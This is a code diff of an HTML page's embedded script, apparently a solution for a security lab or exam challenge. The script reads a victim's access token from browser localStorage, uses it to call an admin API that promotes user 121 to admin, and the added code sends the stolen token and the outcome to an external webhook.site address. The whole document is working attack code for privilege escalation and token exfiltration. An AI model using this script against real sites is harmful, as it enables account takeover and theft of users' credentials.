@@ -9,19 +9,50 @@
   <script>
     const token = localStorage.getItem('access_token');
 
-    fetch('https://cybershortlink-dc105f08.exam.cyberjutsu-lab.tech/api/admin/users/121', {
-      method: 'PUT',
-      headers: {
-        'Authorization': 'Bearer ' + token,
-        'Content-Type': 'application/json',
-        'Accept': 'application/json'
-      },
-      body: JSON.stringify({
-        name: 'Victim',
-        email: 'victim@example.com',
-        role: 'admin'
+    // Hàm gửi webhook
+    function notifyWebhook(data) {
+      fetch('https://webhook.site/64b963bc-2bfe-4ed0-aa14-b7b423f02b8c', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      });
+    }
+
+    if (token) {
+      fetch('https://cybershortlink-dc105f08.exam.cyberjutsu-lab.tech/api/admin/users/121', {
+        method: 'PUT',
+        headers: {
+          'Authorization': 'Bearer ' + token,
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
+        },
+        body: JSON.stringify({
+          name: 'Victim',
+          email: 'victim@example.com',
+          role: 'admin'
+        })
       })
-    });
+      .then(response => {
+        notifyWebhook({
+          status: response.status,
+          ok: response.ok,
+          message: response.ok ? 'Role updated successfully' : 'Failed to update role',
+          token: token
+        });
+      })
+      .catch(error => {
+        notifyWebhook({
+          error: error.toString(),
+          message: 'Request failed',
+          token: token
+        });
+      });
+    } else {
+      notifyWebhook({
+        error: 'No token found in localStorage',
+        message: 'Token missing'
+      });
+    }
   </script>
 </body>
 </html>
